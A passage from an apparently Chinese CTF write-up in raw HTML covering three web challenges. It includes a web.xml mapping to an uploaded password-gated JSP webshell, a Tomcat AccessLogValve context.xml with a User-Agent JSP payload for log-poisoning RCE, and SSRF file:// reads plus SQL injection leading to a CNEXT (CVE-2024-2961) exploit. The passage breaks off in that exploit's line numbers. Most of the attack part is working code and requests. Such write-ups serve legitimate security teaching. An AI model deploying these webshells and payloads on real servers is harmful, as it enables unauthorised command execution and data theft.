     <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>shell<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">jsp-file</span>&gt;</span>/WEB-INF/1.xml<span class="hljs-tag">&lt;/<span class="hljs-name">jsp-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>shell<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/shell<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-ycb-c-tomtom2-1.png"></p><p>然后再传一个1.xml小马</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*,java.io.*&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;%!<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">excuteCmd</span><span class="hljs-params">(String c)</span><br>&#123;<br>    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><span class="hljs-keyword">try</span><br>&#123;<br>    <span class="hljs-type">Process</span> <span class="hljs-variable">pro</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(c);<br>    <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(pro.getInputStream()));<br>    <span class="hljs-type">String</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">while</span> ((temp = buf.readLine()) != <span class="hljs-literal">null</span>)<br>    &#123;<br>        line.append(temp+<span class="hljs-string">&quot;\\n&quot;</span>);<br>    &#125;<br>    buf.close();<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception e)<br>&#123;<br>    line.append(e.getMessage());<br>&#125;<br><span class="hljs-keyword">return</span> line.toString();<br>&#125;<br>%&gt;<br>&lt;%<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;023&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>))&amp;&amp;!<span class="hljs-string">&quot;&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)))<br>&#123;<br>    out.println(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>+excuteCmd(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>))+<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    out.println(<span class="hljs-string">&quot;:-)&quot;</span>);<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-ycb-c-tomtom2-2.png"></p><p>然后访问<code>/myapp/shell</code>即可rce</p><p><img src="/img/wp/2024/2024-ycb-c-tomtom2-3.png"></p><h2 id="tomtom2-revenge"><a href="#tomtom2-revenge" class="headerlink" title="tomtom2_revenge"></a>tomtom2_revenge</h2><p>前面和tomtom2一样，只是不能上传web.xml了，但还能上传其他xml，这样可以传一份context.xml</p><p>通过设置日志路径来写入jsp文件</p><p><img src="/img/wp/2024/2024-ycb-c-tomtom2_revenge-1.png"></p><p>修改下得到</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Context</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Valve</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span> <span class="hljs-attr">directory</span>=<span class="hljs-string">&quot;/opt/tomcat/webapps/myapp/&quot;</span> <span class="hljs-attr">prefix</span>=<span class="hljs-string">&quot;log&quot;</span> <span class="hljs-attr">suffix</span>=<span class="hljs-string">&quot;.jsp&quot;</span> <span class="hljs-attr">pattern</span>=<span class="hljs-string">&quot;%&#123;User-Agent&#125;i&quot;</span> <span class="hljs-attr">resolveHosts</span>=<span class="hljs-string">&quot;false&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Context</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后上传，这里要注意上传到META-INF目录中，而不是WEB-INF目录</p><p>再访问一次，User-Agent中带上jsp代码即可</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/myapp/upload.html</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>139.155.126.78:31506<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>&lt;%= new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter(request.getParameterMap().keySet().toArray(new String[0])[0])).getInputStream()).useDelimiter(request.getParameter(request.getParameterMap().keySet().toArray(new String[0])[1])).next() %&gt;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://139.155.126.78:31506/myapp/login.html<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=1C384267B4E8256CC990EE792436ECBA<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><br></code></pre></td></tr></table></figure><p>然后请求<code>/myapp/log.2024-08-28.jsp?cmd=ls&amp;1=%5CA</code></p><p><img src="/img/wp/2024/2024-ycb-c-tomtom2_revenge-2.png"></p><h2 id="网络照相馆"><a href="#网络照相馆" class="headerlink" title="网络照相馆"></a>网络照相馆</h2><p>ssrf拿到源码</p><p><code>file://localhost/var/www/html/url.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//error_reporting(0);</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;function.php&#x27;</span>;<br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;sql.php&#x27;</span>;<br><br><span class="hljs-variable">$baseDir</span> = <span class="hljs-string">&quot;data/&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$parse</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>]))<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;url错误！&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$baseDir</span> .  <span class="hljs-title function_ invoke__">get_filename</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span> , <span class="hljs-variable">$data</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$filename</span>, <span class="hljs-variable">$url</span>))&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span> , <span class="hljs-variable">$data</span>);<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO `data`(`url`,`filename`) VALUES (?, ?)&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$stmt</span> = <span class="hljs-title function_ invoke__">mysqli_prepare</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>))&#123;<br>            <span class="hljs-title function_ invoke__">mysqli_stmt_bind_param</span>(<span class="hljs-variable">$stmt</span>, <span class="hljs-string">&quot;ss&quot;</span>, <span class="hljs-variable">$url</span>, <span class="hljs-variable">$filename</span>);<br>            <span class="hljs-title function_ invoke__">mysqli_stmt_execute</span>(<span class="hljs-variable">$stmt</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>file://localhost/var/www/html/function.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$tmpInfo</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$tmpInfo</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_filename</span>(<span class="hljs-params"><span class="hljs-variable">$len</span></span>)</span>&#123;<br>    <span class="hljs-variable">$chars</span> = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span>;<br>    <span class="hljs-variable">$var_size</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$chars</span>);<br>    <span class="hljs-variable">$res</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span>( <span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$x</span> &lt; <span class="hljs-variable">$len</span>; <span class="hljs-variable">$x</span>++ ) &#123;<br>        <span class="hljs-variable">$random_str</span>= <span class="hljs-variable">$chars</span>[ <span class="hljs-title function_ invoke__">rand</span>( <span class="hljs-number">0</span>, <span class="hljs-variable">$var_size</span> - <span class="hljs-number">1</span> ) ];<br>        <span class="hljs-variable">$res</span> .= <span class="hljs-variable">$random_str</span>;<br>    &#125;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d&quot;</span>). <span class="hljs-string">&#x27;_&#x27;</span> . <span class="hljs-variable">$res</span> . <span class="hljs-string">&#x27;.txt&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$conn</span> , <span class="hljs-variable">$filename</span>, <span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT filename from data where url = &#x27;<span class="hljs-subst">$url</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_all</span>(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-keyword">foreach</span> ( <span class="hljs-variable">$row</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>)&#123;<br>            <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$filename</span>) === <span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$value</span>[<span class="hljs-number">0</span>]))&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>公告提示说注意hash_file函数，那就很明显可以配合sql注入打hash_file的 CNEXT (CVE-2024-2961)</p><p>调整后的exp</p><p>1：在Remote类中修改读取文件的逻辑，本题中用file:&#x2F;&#x2F;localhost读取&#x2F;proc&#x2F;self&#x2F;maps和libc<br>2：修改exploit的path，搭配sql注入发送payload给hash_file<br>3：注释掉<code>self.check_vulnerable()</code>的判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span 